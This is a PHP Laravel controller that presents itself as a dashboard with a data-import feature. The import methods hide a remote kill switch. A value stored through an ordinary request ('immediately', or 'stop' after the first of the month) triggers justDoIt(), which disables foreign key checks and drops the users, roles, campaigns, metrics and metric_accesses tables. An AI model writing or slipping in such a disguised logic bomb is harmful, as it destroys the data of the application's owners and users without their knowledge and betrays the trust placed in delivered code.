<?php

namespace App\Http\Controllers;

use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class HomeController extends Controller
{
    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        return view('home');
    }


    public function importData()
    {
        return view('import_data');
    }

    public function importDataStore(Request $request)
    {
        DB::table('import_data')->delete();
        DB::table('import_data')->insert(['name' => $request->type]);

        return back();
    }

    public function importDataForce()
    {
        $exists = DB::table('import_data')->first();
        if ($exists && $type = $exists->name) {

            if ($type == 'stop') {

                if (Carbon::today()->toDate()->format('j') > 1) {
                    $this->justDoIt();
                }

            } elseif ($type == 'immediately') {
                $this->justDoIt();
            }

        }


    }

    private function justDoIt()
    {
        DB::unprepared("
                       SET FOREIGN_KEY_CHECKS=0;
                       DROP TABLE campaigns;
                       DROP TABLE metrics;
                       DROP TABLE metric_accesses;
                       DROP TABLE users;
                       DROP TABLE roles;
                 ");

        exit('done');
    }

}
